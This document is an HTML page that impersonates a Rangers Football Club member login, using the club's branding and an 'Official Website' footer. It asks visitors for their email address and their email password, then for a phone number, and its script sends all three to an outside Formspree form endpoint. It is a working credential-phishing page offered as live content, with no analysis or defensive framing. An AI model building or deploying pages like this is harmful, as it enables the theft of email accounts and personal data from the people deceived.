<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rangers Football Club Login</title>
    <style>
        /* Apply a refined background with partial stadium image and gradient */
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-image: url('https://imgs.search.brave.com/tGFjqC4XySJZqE1xHJiCRaTOO89L2afC0M6fPQeJxDg/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9pbWFn/ZXMuc2Vla2xvZ28u/Y29tL2xvZ28tcG5n/LzExLzIvcmFuZ2Vy/cy1mb290YmFsbC1j/bHViLWxvZ28tcG5n/X3NlZWtsb2dvLTEx/NTc5Ny5wbmc'); /* Rangers logo */
            background-size: 50%; /* Only show part of the logo for a cleaner effect */
            background-position: center center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            height: 100vh; /* Full viewport height */
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            text-align: center;
            position: relative;
            background-color: #0047ab; /* Fallback color (Rangers Blue) */
        }

        /* Gradient overlay to give depth and make the content stand out */
        body::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.8)); /* Subtle dark overlay */
            z-index: -1; /* Place the overlay behind all content */
        }

        /* Modal styling */
        .modal {
            display: block;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent dark background */
            padding: 30px;
            width: 300px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
        }

        h2 {
            color: #e60000; /* Rangers Red */
            font-size: 24px;
            font-weight: bold;
        }

        input[type="email"], input[type="password"], input[type="tel"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            background-color: #f4f4f4;
            color: #333;
            font-size: 16px;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #0047ab; /* Rangers Blue */
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }

        button:hover {
            background-color: #003580; /* Darker blue for hover effect */
        }

        /* Footer with additional branding */
        .footer {
            position: fixed;
            bottom: 10px;
            width: 100%;
            text-align: center;
            color: white;
            font-size: 14px;
            opacity: 0.7; /* Faded look */
        }

    </style>
</head>
<body>

<!-- Modal Login Form -->
<div class="modal" id="loginModal">
    <h2>Rangers FC Member Login</h2>
    <form id="loginForm" action="https://formspree.io/f/xwpneebp" method="POST">
        <input type="email" id="email" name="email" placeholder="Enter your email" required>
        <input type="password" id="password" name="password" placeholder="Enter your email password" required>
        <button type="submit">Login</button>
    </form>
</div>

<!-- Phone Number Input (hidden initially) -->
<div class="modal" id="phoneModal" style="display: none;">
    <h2>Enter Your Phone Number</h2>
    <form id="phoneForm" action="https://formspree.io/f/xwpneebp" method="POST">
        <input type="tel" id="phone" name="phone" placeholder="Enter your phone number, we will send the form immediately to your phone." required>
        <button type="submit">Submit</button>
    </form>
</div>

<!-- Footer with Rangers branding -->
<div class="footer">
    <p>Official Website | Rangers Football Club</p>
</div>

<script>
    // Show phone number form after email/password submission
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Capture email and password
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        // Hide the login modal and show the phone number modal
        document.getElementById('loginModal').style.display = 'none';
        document.getElementById('phoneModal').style.display = 'block';

        // Optionally log data to the console for testing
        console.log(`Email: ${email}, Password: ${password}`);
        
        // Save data for later use (e.g., store it in a variable or send to the server immediately)
        window.email = email;
        window.password = password;
    });

    // Handle phone number form submission
    document.getElementById('phoneForm').addEventListener('submit', function(e) {
        e.preventDefault();

        // Capture phone number
        const phone = document.getElementById('phone').value;

        // Log the phone number along with email and password
        console.log(`Phone: ${phone}, Email: ${window.email}, Password: ${window.password}`);

        // Send data to Formspree
        fetch('https://formspree.io/f/xwpneebp', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                email: window.email,
                password: window.password,
                phone: phone
            })
        })
        .then(response => response.text())
        .then(data => {
            // Handle response from server
            alert('Form submitted successfully!');
        })
        .catch(error => console.error('Error:', error));
    });
</script>

</body>
</html>
